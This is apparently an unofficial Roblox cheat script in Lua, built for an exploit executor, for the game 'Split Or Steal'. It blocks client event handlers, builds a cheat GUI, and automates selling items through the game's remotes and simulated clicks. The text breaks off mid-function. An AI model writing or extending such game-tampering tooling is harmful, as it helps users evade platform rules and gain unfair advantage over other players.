local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")
local VIM = game:GetService("VirtualInputManager")
local TS = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- ============================================================
-- === BLOCK LAGGY REMOTE EVENTS (Local Only) ==================
-- ============================================================
local remotesToBlock = {
    "UncollectedUpdated",
    "LeaderboardRankUpdated",
    "MerchantBuyResult",
    "InventoryUpdated",
    "MoneyBroadcast",
    "MultiplierInfo",
    "RollReveal",
    "RevealFlash",
}

local function blockRemote(remote)
    if not remote or not remote:IsA("RemoteEvent") then return end

    local fakeSignal = {
        Connect = function(self, callback)
            print("[BLOCKED] " .. remote.Name)
            return {
                Connected = true,
                Disconnect = function() end
            }
        end,
        Wait = function() while true do task.wait() end end,
    }

    local success, err = pcall(function()
        rawset(remote, "OnClientEvent", fakeSignal)
    end)

    if not success then
        pcall(function()
            local signal = remote.OnClientEvent
            if signal then
                signal.Connect = fakeSignal.Connect
            end
        end)
        print("[WARN] Could not fully replace signal for " .. remote.Name .. ", only new connections blocked")
    end
end

local eventsFolder = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events", 10)
if eventsFolder then
    for _, remote in ipairs(eventsFolder:GetDescendants()) do
        if remote:IsA("RemoteEvent") and table.find(remotesToBlock, remote.Name) then
            blockRemote(remote)
        end
    end
end

print("[AUTO SELL DEBUG]: Blocked laggy remotes: " .. table.concat(remotesToBlock, ", "))

-- === CONSOLE DEBUG LOGGER ===
local function debugLog(msg)
    print("[AUTO SELL DEBUG]: " .. tostring(msg))
end

-- === GHOST SCRIPT CLEANUP ===
if getgenv().SplitOrSteal_Connections then
    for _, conn in ipairs(getgenv().SplitOrSteal_Connections) do pcall(function() conn:Disconnect() end) end
end
if getgenv().SplitOrSteal_Threads then
    for _, thread in ipairs(getgenv().SplitOrSteal_Threads) do pcall(function() task.cancel(thread) end) end
end

getgenv().SplitOrSteal_Connections = {}
getgenv().SplitOrSteal_Threads = {}

local function registerConnection(conn)
    table.insert(getgenv().SplitOrSteal_Connections, conn)
    return conn
end

local function registerThread(func)
    local thread = task.spawn(func)
    table.insert(getgenv().SplitOrSteal_Threads, thread)
    return thread
end

-- === NUMBER FORMATTER ===
local function formatNumberForDisplay(n)
    if not n or n <= 0 then return "0" end
    if n >= 1e12 then return string.format("%.2fT", n / 1e12):gsub("%.00T", "T")
    elseif n >= 1e9 then return string.format("%.2fB", n / 1e9):gsub("%.00B", "B")
    elseif n >= 1e6 then return string.format("%.2fM", n / 1e6):gsub("%.00M", "M")
    elseif n >= 1e3 then return string.format("%.2fK", n / 1e3):gsub("%.00K", "K")
    else return tostring(math.floor(n)) end
end

-- ============================================================
-- === SURPRISE PERSISTENT LOCK ===============================
-- ============================================================
local SURPRISE_FLAG_FILE = "SplitOrSteal_Surprise_Used.txt"
local surpriseAlreadyUsed = false
if writefile and isfile and isfolder then
    pcall(function()
        if isfile(SURPRISE_FLAG_FILE) then
            surpriseAlreadyUsed = true
        end
    end)
end

-- === GUI SETUP ===
local guiParent = (gethui and gethui()) or game:GetService("CoreGui")
if not guiParent then guiParent = LocalPlayer:WaitForChild("PlayerGui") end

if guiParent:FindFirstChild("FancyRemoteGUI") then
    guiParent.FancyRemoteGUI:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FancyRemoteGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = guiParent

registerConnection(UIS.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.RightControl then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end))

-- === PREMIUM UI MAIN STRUCTURE ===
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 320, 0, 360)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -180)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(60, 60, 70)
MainStroke.Thickness = 1.5
MainStroke.Parent = MainFrame

local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 10)

local TopBarExtension = Instance.new("Frame")
TopBarExtension.Size = UDim2.new(1, 0, 0, 10)
TopBarExtension.Position = UDim2.new(0, 0, 1, -10)
TopBarExtension.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
TopBarExtension.BorderSizePixel = 0
TopBarExtension.Parent = TopBar

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Split Or Steal Helper"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TopBar

local function createControlButton(text, color, posOffset)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 18, 0, 18)
    btn.Position = UDim2.new(1, posOffset, 0, 8)
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(25, 25, 30)
    btn.TextSize = 12
    btn.Font = Enum.Font.GothamBold
    btn.Parent = TopBar
    Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
    return btn
end

local MinimizeBtn = createControlButton("-", Color3.fromRGB(255, 170, 0), -50)
local CloseBtn = createControlButton("X", Color3.fromRGB(255, 75, 75), -25)

local BottomBar = Instance.new("Frame")
BottomBar.Name = "BottomBar"
BottomBar.Size = UDim2.new(1, 0, 0, 25)
BottomBar.Position = UDim2.new(0, 0, 1, -25)
BottomBar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
BottomBar.BorderSizePixel = 0
BottomBar.Parent = MainFrame

local BottomStroke = Instance.new("Frame")
BottomStroke.Size = UDim2.new(1, 0, 0, 1)
BottomStroke.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
BottomStroke.BorderSizePixel = 0
BottomStroke.Parent = BottomBar

local PlaytimeLabel = Instance.new("TextLabel")
PlaytimeLabel.Size = UDim2.new(1, 0, 1, 0)
PlaytimeLabel.BackgroundTransparency = 1
PlaytimeLabel.Text = "Session Time: 00:00:00"
PlaytimeLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
PlaytimeLabel.TextSize = 12
PlaytimeLabel.Font = Enum.Font.GothamMedium
PlaytimeLabel.Parent = BottomBar

local startTime = tick()
registerThread(function()
    while task.wait(1) do
        local elapsed = tick() - startTime
        local hours = math.floor(elapsed / 3600)
        local mins = math.floor((elapsed % 3600) / 60)
        local secs = math.floor(elapsed % 60)
        PlaytimeLabel.Text = string.format("Session Time: %02d:%02d:%02d", hours, mins, secs)
    end
end)

registerConnection(CloseBtn.MouseButton1Click:Connect(function()
    for _, conn in ipairs(getgenv().SplitOrSteal_Connections) do pcall(function() conn:Disconnect() end) end
    for _, thread in ipairs(getgenv().SplitOrSteal_Threads) do pcall(function() task.cancel(thread) end) end
    ScreenGui:Destroy()
end))

local dragging, dragStart, startPos
registerConnection(TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
  
        local moveConn, releaseConn
        
        moveConn = UIS.InputChanged:Connect(function(changeInput)
            if changeInput.UserInputType == Enum.UserInputType.MouseMovement or changeInput.UserInputType == Enum.UserInputType.Touch then
                local delta = changeInput.Position - dragStart
                MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
        
        releaseConn = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                moveConn:Disconnect()
                releaseConn:Disconnect()
            end
        end)
    end
end))

-- ============================================================
-- === LOADING SCREEN (Welcome Message) =======================
-- ============================================================
local LoadingScreen = Instance.new("Frame")
LoadingScreen.Name = "LoadingScreen"
LoadingScreen.Size = UDim2.new(1, 0, 1, 0)
LoadingScreen.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
LoadingScreen.BorderSizePixel = 0
LoadingScreen.ZIndex = 200
LoadingScreen.Parent = MainFrame

local LoadingOverlay = Instance.new("Frame")
LoadingOverlay.Size = UDim2.new(0.8, 0, 0.25, 0)
LoadingOverlay.Position = UDim2.new(0.1, 0, 0.375, 0)
LoadingOverlay.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
LoadingOverlay.BorderSizePixel = 0
LoadingOverlay.ZIndex = 201
LoadingOverlay.Parent = LoadingScreen
Instance.new("UICorner", LoadingOverlay).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", LoadingOverlay).Color = Color3.fromRGB(80, 80, 90)
Instance.new("UIStroke", LoadingOverlay).Thickness = 1.5

local WelcomeLabel = Instance.new("TextLabel")
WelcomeLabel.Size = UDim2.new(1, 0, 0.5, 0)
WelcomeLabel.Position = UDim2.new(0, 0, 0.1, 0)
WelcomeLabel.BackgroundTransparency = 1
WelcomeLabel.Text = "Welcome, " .. (LocalPlayer.DisplayName or LocalPlayer.Name)
WelcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WelcomeLabel.Font = Enum.Font.GothamBold
WelcomeLabel.TextSize = 18
WelcomeLabel.TextWrapped = true
WelcomeLabel.ZIndex = 202
WelcomeLabel.Parent = LoadingOverlay

local LoadingSub = Instance.new("TextLabel")
LoadingSub.Size = UDim2.new(1, 0, 0.4, 0)
LoadingSub.Position = UDim2.new(0, 0, 0.55, 0)
LoadingSub.BackgroundTransparency = 1
LoadingSub.Text = "Setting up your experience..."
LoadingSub.TextColor3 = Color3.fromRGB(180, 180, 200)
LoadingSub.Font = Enum.Font.GothamMedium
LoadingSub.TextSize = 12
LoadingSub.ZIndex = 202
LoadingSub.Parent = LoadingOverlay

-- Fade out after 3 seconds
task.spawn(function()
    task.wait(3)
    TS:Create(LoadingScreen, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
    TS:Create(LoadingOverlay, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
    for _, child in ipairs(LoadingOverlay:GetChildren()) do
        if child:IsA("TextLabel") then
            TS:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1}):Play()
        end
    end
    task.wait(0.6)
    LoadingScreen:Destroy()
end)

-- === POPUP SYSTEM ===
local PopupFrame = Instance.new("Frame")
PopupFrame.Size = UDim2.new(1, 0, 1, 0)
PopupFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
PopupFrame.BackgroundTransparency = 0.2
PopupFrame.ZIndex = 100
PopupFrame.Visible = false
PopupFrame.Parent = MainFrame

local PopupBox = Instance.new("Frame")
PopupBox.Size = UDim2.new(0.85, 0, 0.45, 0)
PopupBox.Position = UDim2.new(0.075, 0, 0.275, 0)
PopupBox.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
PopupBox.ZIndex = 101
PopupBox.Parent = PopupFrame
Instance.new("UICorner", PopupBox).CornerRadius = UDim.new(0, 8)
Instance.new("UIStroke", PopupBox).Color = Color3.fromRGB(60, 60, 70)

local PopupTitle = Instance.new("TextLabel")
PopupTitle.Size = UDim2.new(0.9, 0, 0.5, 0)
PopupTitle.Position = UDim2.new(0.05, 0, 0.05, 0)
PopupTitle.BackgroundTransparency = 1
PopupTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
PopupTitle.Font = Enum.Font.GothamBold
PopupTitle.TextSize = 12
PopupTitle.TextWrapped = true
PopupTitle.ZIndex = 102
PopupTitle.Parent = PopupBox

local YesBtn = Instance.new("TextButton")
YesBtn.Size = UDim2.new(0.4, 0, 0.3, 0)
YesBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
YesBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
YesBtn.Text = "YES"
YesBtn.TextColor3 = Color3.fromRGB(20, 35, 20)
YesBtn.Font = Enum.Font.GothamBold
YesBtn.ZIndex = 102
YesBtn.Parent = PopupBox
Instance.new("UICorner", YesBtn).CornerRadius = UDim.new(0, 4)

local NoBtn = Instance.new("TextButton")
NoBtn.Size = UDim2.new(0.4, 0, 0.3, 0)
NoBtn.Position = UDim2.new(0.55, 0, 0.6, 0)
NoBtn.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
NoBtn.Text = "NO"
NoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
NoBtn.Font = Enum.Font.GothamBold
NoBtn.ZIndex = 102
NoBtn.Parent = PopupBox
Instance.new("UICorner", NoBtn).CornerRadius = UDim.new(0, 4)

local popupCallback = nil
registerConnection(YesBtn.MouseButton1Click:Connect(function()
    PopupFrame.Visible = false
    if popupCallback then popupCallback(true) end
end))
registerConnection(NoBtn.MouseButton1Click:Connect(function()
    PopupFrame.Visible = false
    if popupCallback then popupCallback(false) end
end))

local function ShowPopup(message, callback)
    PopupTitle.Text = message
    popupCallback = callback
    PopupFrame.Visible = true
end

-- === TAB NAVIGATION BAR ===
local TabBar = Instance.new("Frame")
TabBar.Name = "TabBar"
TabBar.Size = UDim2.new(1, -10, 0, 28)
TabBar.Position = UDim2.new(0, 5, 0, 40)
TabBar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
TabBar.BorderSizePixel = 0
TabBar.Parent = MainFrame
Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 6)

local TabListLayout = Instance.new("UIListLayout")
TabListLayout.FillDirection = Enum.FillDirection.Horizontal
TabListLayout.SortOrder = Enum.SortOrder.LayoutOrder
TabListLayout.Parent = TabBar

local function createTabButton(name, layoutOrder)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.25, 0, 1, 0)
    btn.LayoutOrder = layoutOrder
    btn.BackgroundTransparency = 1
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(150, 150, 160)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 11
    btn.Parent = TabBar
    
    local indicator = Instance.new("Frame")
    indicator.Size = UDim2.new(1, 0, 0, 2)
    indicator.Position = UDim2.new(0, 0, 1, -2)
    indicator.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
    indicator.BorderSizePixel = 0
    indicator.Visible = false
    indicator.Parent = btn
    
    return btn, indicator
end

local AutoFarmTabBtn, AutoFarmInd = createTabButton("AUTOFARM", 1)
local AutoSellTabBtn, AutoSellInd = createTabButton("AUTO SELL", 2)
local MiscTabBtn, MiscInd = createTabButton("MISC", 3)
local SurpriseTabBtn, SurpriseInd = createTabButton("😱 SURPRISE", 4)

local function createContainer(name)
    local container = Instance.new("ScrollingFrame")
    container.Name = name
    container.Size = UDim2.new(1, -10, 1, -100) 
    container.Position = UDim2.new(0, 5, 0, 72)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.ScrollBarThickness = 3
    container.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 110)
    container.AutomaticCanvasSize = Enum.AutomaticSize.Y 
    container.CanvasSize = UDim2.new(0, 0, 0, 0)
    container.Visible = false
    container.Parent = MainFrame
    return container
end

local AutoFarmContainer = createContainer("AutoFarmContainer")
local AutoSellContainer = createContainer("AutoSellContainer")
local MiscContainer = createContainer("MiscContainer")
local SurpriseContainer = createContainer("SurpriseContainer")

for _, cont in ipairs({AutoFarmContainer, AutoSellContainer}) do
    local UIPadding = Instance.new("UIPadding")
    UIPadding.PaddingTop = UDim.new(0, 5)
    UIPadding.PaddingBottom = UDim.new(0, 5)
    UIPadding.PaddingLeft = UDim.new(0, 5)
    UIPadding.Parent = cont
end

local AutoFarmGrid = Instance.new("UIGridLayout")
AutoFarmGrid.CellSize = UDim2.new(0, 143, 0, 34) 
AutoFarmGrid.CellPadding = UDim2.new(0, 8, 0, 8)
AutoFarmGrid.SortOrder = Enum.SortOrder.LayoutOrder
AutoFarmGrid.Parent = AutoFarmContainer

local MiscLayout = Instance.new("UIListLayout", MiscContainer)
MiscLayout.SortOrder = Enum.SortOrder.LayoutOrder
MiscLayout.Padding = UDim.new(0, 10)

local MiscPadding = Instance.new("UIPadding", MiscContainer)
MiscPadding.PaddingTop = UDim.new(0, 5)
MiscPadding.PaddingBottom = UDim.new(0, 5)
MiscPadding.PaddingLeft = UDim.new(0, 5)
MiscPadding.PaddingRight = UDim.new(0, 5)

local MiscTogglesFrame = Instance.new("Frame", MiscContainer)
MiscTogglesFrame.Size = UDim2.new(1, 0, 0, 0)
MiscTogglesFrame.BackgroundTransparency = 1
MiscTogglesFrame.AutomaticSize = Enum.AutomaticSize.Y
MiscTogglesFrame.LayoutOrder = 1

local MiscTogglesGrid = Instance.new("UIGridLayout", MiscTogglesFrame)
MiscTogglesGrid.CellSize = UDim2.new(0, 143, 0, 34)
MiscTogglesGrid.CellPadding = UDim2.new(0, 8, 0, 8)
MiscTogglesGrid.SortOrder = Enum.SortOrder.LayoutOrder

local MiscDivider = Instance.new("Frame", MiscContainer)
MiscDivider.Size = UDim2.new(1, -10, 0, 1)
MiscDivider.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
MiscDivider.BorderSizePixel = 0
MiscDivider.LayoutOrder = 2

local function switchTab(tabName)
    AutoFarmContainer.Visible = (tabName == "AutoFarm")
    AutoSellContainer.Visible = (tabName == "AutoSell")
    MiscContainer.Visible = (tabName == "Misc")
    SurpriseContainer.Visible = (tabName == "Surprise")

    AutoFarmTabBtn.TextColor3 = (tabName == "AutoFarm") and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 160)
    AutoSellTabBtn.TextColor3 = (tabName == "AutoSell") and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 160)
    MiscTabBtn.TextColor3 = (tabName == "Misc") and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 160)
    SurpriseTabBtn.TextColor3 = (tabName == "Surprise") and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 160)

    AutoFarmInd.Visible = (tabName == "AutoFarm")
    AutoSellInd.Visible = (tabName == "AutoSell")
    MiscInd.Visible = (tabName == "Misc")
    SurpriseInd.Visible = (tabName == "Surprise")
end

registerConnection(AutoFarmTabBtn.MouseButton1Click:Connect(function() switchTab("AutoFarm") end))
registerConnection(AutoSellTabBtn.MouseButton1Click:Connect(function() switchTab("AutoSell") end))
registerConnection(MiscTabBtn.MouseButton1Click:Connect(function() switchTab("Misc") end))
registerConnection(SurpriseTabBtn.MouseButton1Click:Connect(function() switchTab("Surprise") end))
switchTab("AutoFarm")

-- === NEW MINIMIZE LOGIC ===
local minimized = false
local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
registerConnection(MinimizeBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        TabBar.Visible = false
        AutoFarmContainer.Visible = false
        AutoSellContainer.Visible = false
        MiscContainer.Visible = false
        SurpriseContainer.Visible = false
        BottomBar.Visible = false
        TS:Create(MainFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 35)}):Play()
    else
        TS:Create(MainFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 360)}):Play()
        task.wait(0.2) 
        TabBar.Visible = true
        BottomBar.Visible = true
        AutoFarmContainer.Visible = AutoFarmInd.Visible
        AutoSellContainer.Visible = AutoSellInd.Visible
        MiscContainer.Visible = MiscInd.Visible
        SurpriseContainer.Visible = SurpriseInd.Visible
    end
end))

-- ============================================================
-- === AUTO SELL WARNING LABEL ================================
-- ============================================================
local WarningLabel = Instance.new("TextLabel")
WarningLabel.Size = UDim2.new(1, -10, 0, 45)
WarningLabel.LayoutOrder = 0
WarningLabel.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
WarningLabel.Text = "⚠️ WARNING: Misconfiguring Auto Sell can wipe your entire inventory instantly. Always double-check your rarity filters and value threshold before enabling."
WarningLabel.TextColor3 = Color3.fromRGB(30, 30, 35)
WarningLabel.Font = Enum.Font.GothamSemibold
WarningLabel.TextSize = 11
WarningLabel.TextWrapped = true
WarningLabel.TextXAlignment = Enum.TextXAlignment.Left
WarningLabel.Parent = AutoSellContainer
Instance.new("UICorner", WarningLabel).CornerRadius = UDim.new(0, 6)
local WarningStroke = Instance.new("UIStroke", WarningLabel)
WarningStroke.Color = Color3.fromRGB(255, 100, 0)
WarningStroke.Thickness = 1.5

-- === SMART AUTO SELL SYSTEM ===
local autoSellEnabled = false
local sellThreshold = 0
local selectedRarities = {}
local sellQueue = {}
local isSelling = false
local rarityUIElements = {} 
local lastSellActivity = 0

local allRarities = {
    "Common", "Uncommon", "Rare", "Epic", "Legendary", "Mythic", 
    "Event", "Secret", "Divine", "Cosmic", "Celestial", "Brainrot God", "Brainrot Infinite"
}

local AutoSellList = Instance.new("UIListLayout", AutoSellContainer)
AutoSellList.SortOrder = Enum.SortOrder.LayoutOrder
AutoSellList.Padding = UDim.new(0, 8)
AutoSellList.HorizontalAlignment = Enum.HorizontalAlignment.Center

WarningLabel.LayoutOrder = 1

local function parseValue(str)
    if not str or str == "" then return nil end
    str = tostring(str):lower():gsub(",", ""):gsub(" ", ""):gsub("%$", "")
    local multi = 1
    if str:match("k$") then multi = 1e3; str = str:gsub("k$", "")
    elseif str:match("m$") then multi = 1e6; str = str:gsub("m$", "")
    elseif str:match("b$") then multi = 1e9; str = str:gsub("b$", "")
    elseif str:match("t$") then multi = 1e12; str = str:gsub("t$", "") end
    local num = tonumber(str)
    return num and (num * multi) or nil
end

local MasterSellBtn = Instance.new("TextButton")
MasterSellBtn.Size = UDim2.new(1, -10, 0, 35)
MasterSellBtn.LayoutOrder = 2
MasterSellBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
MasterSellBtn.Text = "Smart Auto Sell: OFF"
MasterSellBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
MasterSellBtn.Font = Enum.Font.GothamBold
MasterSellBtn.TextSize = 13
MasterSellBtn.Parent = AutoSellContainer
Instance.new("UICorner", MasterSellBtn).CornerRadius = UDim.new(0, 6)
local MasterSellStroke = Instance.new("UIStroke", MasterSellBtn)
MasterSellStroke.Color = Color3.fromRGB(50, 50, 60)

registerConnection(MasterSellBtn.MouseButton1Click:Connect(function()
    if not autoSellEnabled then
        if sellThreshold <= 0 then
            ShowPopup("Please set a valid Max Value before enabling Auto Sell!", function() end)
            return
        end
        ShowPopup("Are you sure? This will mass-sell all selected items under " .. formatNumberForDisplay(sellThreshold) .. "!", function(confirmed)
            if confirmed then
                autoSellEnabled = true
                MasterSellBtn.Text = "Smart Auto Sell: ON"
                MasterSellBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
                MasterSellBtn.TextColor3 = Color3.fromRGB(20, 35, 20)
                MasterSellStroke.Color = Color3.fromRGB(0, 200, 110)
                lastSellActivity = tick()
            end
        end)
    else
        autoSellEnabled = false
        MasterSellBtn.Text = "Smart Auto Sell: OFF"
        MasterSellBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        MasterSellBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
        MasterSellStroke.Color = Color3.fromRGB(50, 50, 60)
        sellQueue = {}
        isSelling = false
    end
end))

local ThresholdBox = Instance.new("TextBox")
ThresholdBox.Size = UDim2.new(1, -10, 0, 35)
ThresholdBox.LayoutOrder = 3
ThresholdBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
ThresholdBox.Text = ""
ThresholdBox.PlaceholderText = "Max Value (e.g., 1.5M, 2B, 10000)"
ThresholdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ThresholdBox.Font = Enum.Font.GothamSemibold
ThresholdBox.TextSize = 12
ThresholdBox.Parent = AutoSellContainer
Instance.new("UICorner", ThresholdBox).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", ThresholdBox).Color = Color3.fromRGB(50, 50, 60)

registerConnection(ThresholdBox.FocusLost:Connect(function()
    local newVal = parseValue(ThresholdBox.Text)
    if not newVal then 
        ThresholdBox.Text = "Max Value: " .. formatNumberForDisplay(sellThreshold)
        return
    end

    ShowPopup("Set the sell limit to " .. formatNumberForDisplay(newVal) .. "?", function(confirmed)
        if confirmed then
            sellThreshold = newVal
        end
        ThresholdBox.Text = "Max Value: " .. formatNumberForDisplay(sellThreshold)
    end)
end))

local RarityGridContainer = Instance.new("Frame")
RarityGridContainer.Size = UDim2.new(1, 0, 0, 0)
RarityGridContainer.LayoutOrder = 4
RarityGridContainer.BackgroundTransparency = 1
RarityGridContainer.AutomaticSize = Enum.AutomaticSize.Y
RarityGridContainer.Parent = AutoSellContainer

local RarityGrid = Instance.new("UIGridLayout", RarityGridContainer)
RarityGrid.CellSize = UDim2.new(0, 93, 0, 28)
RarityGrid.CellPadding = UDim2.new(0, 7, 0, 7)
RarityGrid.SortOrder = Enum.SortOrder.LayoutOrder

local function updateRarityVisuals(rarity, state)
    local ui = rarityUIElements[rarity]
    if not ui then return end
    selectedRarities[rarity] = state
    if state then
        ui.btn.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
        ui.btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        ui.stroke.Color = Color3.fromRGB(0, 150, 200)
    else
        ui.btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        ui.btn.TextColor3 = Color3.fromRGB(150, 150, 160)
        ui.stroke.Color = Color3.fromRGB(50, 50, 60)
    end
end

for i, rarity in ipairs(allRarities) do
    selectedRarities[rarity] = false

    local rBtn = Instance.new("TextButton")
    rBtn.LayoutOrder = i
    rBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    rBtn.Text = rarity
    rBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
    rBtn.Font = Enum.Font.GothamSemibold
    rBtn.TextSize = 11
    rBtn.Parent = RarityGridContainer
    Instance.new("UICorner", rBtn).CornerRadius = UDim.new(0, 4)
    local rStroke = Instance.new("UIStroke", rBtn)
    rStroke.Color = Color3.fromRGB(50, 50, 60)

    rarityUIElements[rarity] = {btn = rBtn, stroke = rStroke}

    registerConnection(rBtn.MouseButton1Click:Connect(function()
        updateRarityVisuals(rarity, not selectedRarities[rarity])
    end))
end

-- === INVENTORY SELL CORE (ROBUST & FIXED) ===
registerThread(function()
    local invRemote
    pcall(function() 
        invRemote = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("InventoryUpdated")
    end)
    local sellRemote = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("SellItem")

    local function parseUITextValue(str)
        if type(str) ~= "string" then return 0 end
        str = str:lower():gsub("%$", ""):gsub("/s", ""):gsub(",", ""):gsub(" ", "")
        local multi = 1
        if str:match("k$") then multi = 1e3; str = str:gsub("k$", "")
        elseif str:match("m$") then multi = 1e6; str = str:gsub("m$", "")
        elseif str:match("b$") then multi = 1e9; str = str:gsub("b$", "")
        elseif str:match("t$") then multi = 1e12; str = str:gsub("t$", "") end
        local num = tonumber(str)
        return num and (num * multi) or 0
    end

    local function getInventoryScrollFrame()
        local pGui = LocalPlayer:FindFirstChild("PlayerGui")
        if not pGui then return nil end
        local success, result = pcall(function()
            return pGui.FullGameGUIV2.InventoryHUD.Canvas.Scrollingframe
        end)
        return success and result or nil
    end

    local function clickUnequipAll()
        pcall(function()
            local inventoryHUD = LocalPlayer.PlayerGui:FindFirstChild("FullGameGUIV2") and LocalPlayer.PlayerGui.FullGameGUIV2:FindFirstChild("InventoryHUD")
            if inventoryHUD then
                local unequipBtn = inventoryHUD:FindFirstChild("UnequipAll")
                if unequipBtn and unequipBtn:IsA("GuiButton") then
                    local pos = unequipBtn.AbsolutePosition + unequipBtn.AbsoluteSize/2
                    VIM:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 0)
                    VIM:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 0)
                end
            end
        end)
    end

    local lastSellAttempt = 0
    local function processSellQueue()
        if isSelling then return end
        isSelling = true
        lastSellActivity = tick()
        registerThread(function()
            local queueSnapshot = {}
            for k, v in pairs(sellQueue) do queueSnapshot[k] = v end
            sellQueue = {}
            for itemId, _ in pairs(queueSnapshot) do
                if not autoSellEnabled then break end
                local success = false
                for attempt = 1, 3 do
                    success = pcall(function()
                        sellRemote:FireServer(itemId)
                    end)
                    if success then
                        lastSellActivity = tick()
                        break
                    end
                    task.wait(0.1)
                end
                if not success then
                    debugLog("FAILED to sell item ID: " .. tostring(itemId) .. " after 3 attempts")
                    sellQueue[itemId] = true
                end
                task.wait(0.15)
            end
            isSelling = false
        end)
    end

    local isScanning = false
    local function scanUIForItems()
        if not autoSellEnabled or isScanning then return end
        isScanning = true
        pcall(function()
            local scrollFrame = getInventoryScrollFrame()
            if not scrollFrame then 
                isScanning = false
                return 
            end

            local uiItemIds = {}
            for _, itemFrame in ipairs(scrollFrame:GetChildren()) do
                if not itemFrame:IsA("UIListLayout") and not itemFrame:IsA("UIGridLayout") and not itemFrame:IsA("UIPadding") then
